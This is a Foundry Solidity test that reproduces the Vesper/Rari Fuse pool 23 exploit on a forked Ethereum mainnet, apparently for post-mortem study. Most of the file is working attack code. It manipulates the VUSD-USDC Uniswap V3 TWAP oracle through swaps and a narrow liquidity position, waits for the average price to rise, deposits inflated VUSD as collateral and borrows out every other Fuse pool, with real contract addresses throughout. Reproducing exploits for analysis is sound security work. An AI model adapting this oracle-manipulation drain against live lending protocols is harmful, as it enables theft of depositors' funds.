// SPDX-License-Identifier: MIT
pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import {TestHarness} from "../../TestHarness.sol";

import {IERC20} from '../../interfaces/IERC20.sol';
import {IWETH9} from '../../interfaces/IWETH9.sol';

import {IUniswapV3Pair} from '../../utils/IUniswapV3Pair.sol';

import {TokenBalanceTracker} from '../../modules/TokenBalanceTracker.sol';
import {TWAPGetter} from '../../modules/TWAPGetter.sol';

interface IVUSDMinter {
    function mint(
        address _token,
        uint256 _amount,
        address _receiver
    ) external;
}

interface IUniV3PositionsNFT {
    struct MintParams {
        address token0;
        address token1;
        uint24 fee;
        int24 tickLower;
        int24 tickUpper;
        uint256 amount0Desired;
        uint256 amount1Desired;
        uint256 amount0Min;
        uint256 amount1Min;
        address recipient;
        uint256 deadline;
    }

    function mint(MintParams calldata params)
        external
        payable
        returns (
            uint256 tokenId,
            uint128 liquidity,
            uint256 amount0,
            uint256 amount1
        );
}

interface IUnitroller {
    function enterMarkets(address[] memory cTokens) external payable returns(uint256[] memory);
    function exitMarket(address market) external;
    function borrowCaps(address market) external view returns(uint256);
}

interface ICERC20Delegator {
    function mint(uint256 mintAmount) external payable returns (uint256);
    function balanceOf(address _of) external view returns(uint256);
    function decimals() external view returns(uint16);
    function borrow(uint256 borrowAmount) external payable returns (uint256);
    function accrueInterest() external;
    function approve(address spender, uint256 amt) external;
    function redeemUnderlying(uint256 redeemAmount) external payable returns (uint256);
}

contract ModuleImports is TokenBalanceTracker, TWAPGetter { }

contract Exploit_VesperRariFuse is TestHarness, ModuleImports {
    IUniswapV3Pair internal pairUsdcWeth = IUniswapV3Pair(0x88e6A0c2dDD26FEEb64F039a2c41296FcB3f5640);
    IUniswapV3Pair internal pairUsdcVusd = IUniswapV3Pair(0x8dDE0A1481b4A14bC1015A5a8b260ef059E9FD89);

    IVUSDMinter internal minter = IVUSDMinter(0xb652Fc42E12828F3F1b3e96283b199E62EC570Db);
    IUniV3PositionsNFT internal positionManager = IUniV3PositionsNFT(0xC36442b4a4522E871399CD717aBDD847Ab11FE88);
    IUnitroller internal unitroller = IUnitroller(0xF53c73332459b0dBd14d8E073319E585f7a46434);

    uint160 internal constant SQRT_SWAP_MAX = 1461446703485210103287273052203988822378723970341;

    uint256 timesEntered;

    address[] tokens = [
        0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48, // USDC
        0x677ddbd918637E5F2c79e164D402454dE7dA8619, // VUSD
        0xbA4cFE5741b357FA371b506e5db0774aBFeCf8Fc, // VVSP
        0x2260FAC5E5542a773Aa44fBCfeDf7C193bc2C599, // WBTC
        0x6B175474E89094C44Da98b954EedeAC495271d0F, // DAI
        0x86ed939B500E121C0C5f493F399084Db596dAd20, // SPC
        0x1b40183EFB4Dd766f11bDa7A7c3AD8982e998421, // VSP
        0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2  // WETH
    ];

    address[] cTokens = [
        0x2F251E9074E3A3575D0105586D53A92254528Fc5, // fUSDC-23
        0x2914e8C1c2C54E5335dC9554551438c59373e807, // fVUSD-23
        0x63475Ab76E578Ec27ae2494d29E1df288817d931, // fVVSP-23
        0x0302F55dC69F5C4327c8A6c3805c9E16fC1c3464, // fWBTC-23
        0x19D13B4C0574B8666e9579Da3C387D5287AF410c, // fDAI-23
        0x712808b1E8A17F90df1Bc0FAA33A6A211c3311a9, // fSPC-23
        0x0879DbeE0614cc3516c464522e9B2e10eB2D415A, // fVSP-23
        0x258592543a2D018E5BdD3bd74D422f952D4B3C1b  // fETH-23 must be in the end of this array
    ];

    IWETH9 internal weth = IWETH9(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2);

    uint256 forkId;
    function setUp() external {
        forkId = cheat.createSelectFork('mainnet', 13537921); // Just one block before the manipulation.
        // We will roll the blocknumber later.

        cheat.deal(address(this), 99.92 ether); // Received from tornado cash
        // https://etherscan.io/tx/0x1423391a93b283e9a001d5faee292cb82c55d04f021c53f7eda0f600665f8cba

        // On deployment, entered markets from unitroller and approved VUSD - After the rollFork this is no longer persistent. Call it again later.
        // unitroller.enterMarkets(cTokens);
        // IERC20(tokens[1]).approve(cTokens[1], type(uint256).max); // Approve VUSD to fVUSD-23

        // Setup the balance tracker
        addTokensToTracker(tokens);
    }

    function test_attack() external {
        console.log('Attacker initial balances');
        logBalances(address(this));
        
        console.log('------- PART ONE: ORACLE MANIPULATION -------');
        console.log('VUSD-USD Price before manipulation:', getCurrentPrice(pairUsdcVusd));
        console.log('Block: %s - VUSD-USD TWAP 10min window: %s',block.number, getUniswapTwapPrice(pairUsdcVusd, 600));
        attackOne();

        // This is the current price without using the weighted average. 
        // In order to generate a tendency to this number, blocks need to pass.
        // The TWAP reads prices from the past and the most recent values are lighter than the older ones.
        console.log('VUSD-USD Price after manipulation:', getCurrentPrice(pairUsdcVusd));
        console.log('Block: %s - VUSD-USD TWAP 10min window: %s', block.number, getUniswapTwapPrice(pairUsdcVusd, 600));
        console.log('\n');

        console.log('------- PART TWO: WAIT UNTIL THE TWAP INCREASES -------');
        // The attacker waited 11 mins between both transactions, triggering the borrows at block 13537933.
        uint256 nextTxBlock = 13537933;
        waitAndLogTWAP(nextTxBlock);
        console.log('\n');

        console.log('------- PART THREE: DRAIN THE POOLS -------');
        require(block.number == nextTxBlock - 1, 'wrong block number');
        attackTwo();
    }

    function attackOne() internal {
        console.log('\n');
        console.log('------- STEP I: Getting WETH -------');
        weth.deposit{value: 56818181818181818181}();
        
        console.log('Attacker balances');
        logBalances(address(this));
        
        console.log('------- STEP II: SWAPPING WETH FOR USDC -------');
        pairUsdcWeth.swap(address(this), false, int256(weth.balanceOf(address(this))), SQRT_SWAP_MAX, new bytes(0xdead));
        
        console.log('Attacker balances');
        logBalances(address(this));

        console.log('------- STEP III: MINT VUSD WITH USDC -------');
        IERC20(tokens[0]).approve(address(minter), type(uint256).max);
        minter.mint(tokens[0], 1_000_000, address(this)); // Get one VUSD

        console.log('Attacker balances');
        logBalances(address(this));
        
        console.log('------- STEP IV: MINT NFT (?)  -------');
        IERC20(tokens[0]).approve(address(positionManager), type(uint256).max);
        IERC20(tokens[1]).approve(address(positionManager), type(uint256).max);
       
        IUniV3PositionsNFT.MintParams memory mintParams = getMintingParams();
        positionManager.mint(mintParams);

        console.log('Attacker balances');
        logBalances(address(this));

        console.log('------- STEP V: BUY ALL VUSD POOL  -------');
        pairUsdcVusd.swap(address(this), false, type(int256).max, SQRT_SWAP_MAX, '');

        console.log('Attacker balances');
        logBalances(address(this));
    }

    function waitAndLogTWAP(uint256 _blockLimit) internal {
        uint256 latestBlock = block.number;
        
        // The rollFork call wipes our token balances. So we recover them with a cheats. Maybe persistency is broken for tokens.
        (uint256 nativeBalance, uint256[] memory tokenBalance) = getBalanceTrackers(address(this));

        while(latestBlock < _blockLimit-1){
            cheat.rollFork(block.number + 1);

            latestBlock = block.number;
            console.log('Block: %s - VUSD-USD TWAP 10min window: %s', block.number, getUniswapTwapPrice(pairUsdcVusd, 600));
        }

        cheat.deal(address(this), nativeBalance);
        for(uint256 i = 0; i < tokenBalance.length; i ++){
            writeTokenBalance(address(this), tokens[i], tokenBalance[i]);
        }
    }

    function attackTwo() internal {
        // We add to the tracking only the Vesper Pool VUSD because we are only giving VUSD as a collateral.
        addTokenToTracker(cTokens[1]);

        IERC20(tokens[1]).approve(cTokens[1], type(uint256).max); // Approve VUSD to fVUSD-23
        unitroller.enterMarkets(cTokens);

        console.log('------- STEP I: MINTING fVUSD-23 FUSE -------');
        uint256 vusdInitialBalance = IERC20(tokens[1]).balanceOf(address(this)); 
        require(ICERC20Delegator(cTokens[1]).mint(vusdInitialBalance) == 0, 'error minting');
                
        console.log('Attacker balances');
        logBalances(address(this));

        console.log('------- STEP II: LOOP OVER ALL STABLES AND DRAIN EACH POOL -------'); // REKT
        uint256 amountToDrain;
        // Loop over VVSP, WBTC, DAI, SPC, VSP
        for(uint i = 2; i < cTokens.length - 1; i++){
            amountToDrain = IERC20(tokens[i]).balanceOf(cTokens[i]);
            require(ICERC20Delegator(cTokens[i]).borrow(amountToDrain) == 0, 'error borrowing');
            console.log("------- STEP II-%s: BORROWING ON %s POOL -------", i - 1, IERC20(tokens[i]).name());
            logBalances(address(this));
        }

        // Then drain USDC and ETH pools
        amountToDrain = IERC20(tokens[0]).balanceOf(cTokens[0]);
        require(ICERC20Delegator(cTokens[0]).borrow(amountToDrain) == 0, 'usdc pool borrow failed');

        console.log("------- STEP II-%s: BORROWING ON %s POOL -------", 6, IERC20(tokens[0]).name());
        logBalances(address(this));

        amountToDrain = cTokens[cTokens.length - 1].balance; // fETH-23
        require(ICERC20Delegator(cTokens[cTokens.length - 1]).borrow(amountToDrain) == 0, 'eth pool borrow failed');

        console.log("------- STEP II-%s: BORROWING ON %s POOL -------", 7, 'ETH');
        logBalances(address(this));
    }

    function uniswapV3SwapCallback(int256 /* amount0Delta */, int256 amount1Delta,  bytes memory /* data */) external {
        // Means that this callback is called for the first time while getting USDC
        timesEntered++;
        if(timesEntered == 1){
            require(msg.sender == address(pairUsdcWeth), 'Only USDC-WETH pair');
            
            weth.transfer(address(pairUsdcWeth), weth.balanceOf(address(this))); // We are swapping all our WETH
        }

        // Means that this callback is called while getting all the VUSD
        if(timesEntered == 2){
            require(msg.sender == address(pairUsdcVusd), 'Only USDC-VUSD pair');

            IERC20(tokens[0]).transfer(address(pairUsdcVusd), uint256(amount1Delta)); // Send the USDC counterpart
        }
    }


    receive() external payable {}

    function onERC721Received(
        address,
        address,
        uint256,
        bytes calldata
    ) external virtual returns (bytes4) {
        return this.onERC721Received.selector;
    }

    function getMintingParams() internal view returns(IUniV3PositionsNFT.MintParams memory) {
        IUniV3PositionsNFT.MintParams memory tempParams;
        tempParams.token0 = tokens[1];
        tempParams.token1 = tokens[0];
        tempParams.fee = 500;
        tempParams.tickLower = -887260;
        tempParams.tickUpper = -887250;
        tempParams.amount0Desired = 0;
        tempParams.amount1Desired = 100000;
        tempParams.amount0Min = 0;
        tempParams.amount1Min = 0;
        tempParams.recipient = address(this);
        tempParams.deadline = 177777777700000;

        return tempParams;
    }


}
